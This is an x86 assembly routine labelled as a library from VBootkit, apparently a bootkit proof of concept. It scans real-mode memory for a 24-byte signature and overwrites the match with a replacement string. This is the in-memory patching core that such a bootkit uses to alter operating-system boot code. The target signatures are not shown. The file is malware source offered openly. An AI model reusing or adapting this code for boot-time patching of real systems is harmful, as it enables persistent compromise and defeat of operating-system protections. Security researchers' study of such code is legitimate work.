
;;;;;;;;;;;;;;;;;;;;;;;;;;;
; >>> LIB BY VBootkit <<< ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;

pushad
push ds
push es

mov [Found_Signature],byte 0

ror edi,4
mov es,di
shr edi,32-4

%ifdef USE_DWORD_SCAN_ENGINE

mov esi,ProbeString
ror esi,4
mov ds,si
shr esi,32-4

shr ecx,2
mov eax,[si]

ScanString:

repne scasd
jecxz CheckSignature_Exit

add si,4
mov eax,[si]
or al,al
jnz ScanString

mov [Found_Signature],byte 1
sub edi,24       ;
ror edi,4
mov ax,ds
add di,ax
rol edi,4
mov [Found_Address],dword edi

%else

Fast_Compare_String:

mov esi,ProbeString
ror esi,4
mov ds,si
shr esi,32-4

lodsb
repne scasb
jecxz CheckSignature_Exit
jne CheckSignature_Exit

cmp ecx,23
jb CheckSignature_Exit

push ecx
mov ecx,23
rep cmpsb
pop ecx
je Found

jecxz CheckSignature_Exit
dec di
inc cx
jmp Fast_Compare_String

Found:
mov [Found_Signature],byte 1
sub edi,24
ror edi,4
mov ax,es
add di,ax
rol edi,4
mov [Found_Address],dword edi

%endif

CheckSignature_Exit:
pop es
pop ds
popad

ret

ReplaceFoundSignature:
pushad
push ds
push es

cmp [Found_Signature],byte 0
je ReplaceFoundSignature_Exit

mov edi,[Found_Address]
ror edi,4
mov es,di
shr edi,32-4

mov esi,ReplaceString
ror esi,4
mov ds,si
shr esi,32-4

mov ecx,24 / 4
rep movsd

ReplaceFoundSignature_Exit:
pop es
pop ds
popad

ret